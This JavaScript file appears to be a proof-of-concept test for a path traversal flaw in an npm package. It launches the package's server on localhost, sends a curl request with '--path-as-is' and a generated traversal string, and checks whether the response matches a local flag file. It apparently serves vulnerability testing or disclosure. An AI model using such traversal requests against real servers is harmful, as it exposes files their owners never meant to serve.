function exploitFunction(payload) {
  const { genstr } = payload;

  afterAll(() => {
    try {
      execSync("fuser -k 8888/tcp");
    } catch (e) {}
  });

  const path = require("path");  // Import the path module
  const { sleep } = require("sleep");
  const pathToFlag = path.resolve(__dirname, "../flag.html");

  let server = "node ./node_modules/yjmyjmyjm/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr(50)}`; // Using the payload's genstr function

  exec(attack_string, (error, stdout) => {
    if (stdout === fs.readFileSync(pathToFlag).toString()) {
      console.log("Exploit successful!");
    } else {
      console.error("Exploit failed!");
    }
  });
}

module.exports = { exploitFunction };